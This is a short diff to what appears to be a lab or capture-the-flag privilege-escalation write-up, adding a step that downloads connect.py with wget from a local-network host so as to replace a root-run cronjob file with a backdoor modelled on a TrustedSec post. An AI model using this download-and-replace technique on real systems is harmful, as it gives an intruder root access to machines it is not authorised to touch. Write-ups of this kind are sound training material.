@@ -107,7 +107,11 @@ As cronjobs are usually run as root ,We can completely replace the file with an 
 
 # Exploit 
 
-Replace the file with an exploit of our own 
+Using wget
+```
+wget 192.168.114.131/connect.py
+```
+We Replace the file with an exploit of our own 
 From https://www.trustedsec.com/2011/06/creating-a-13-line-backdoor-worry-free-of-av/
 ```
 #!/usr/bin/python
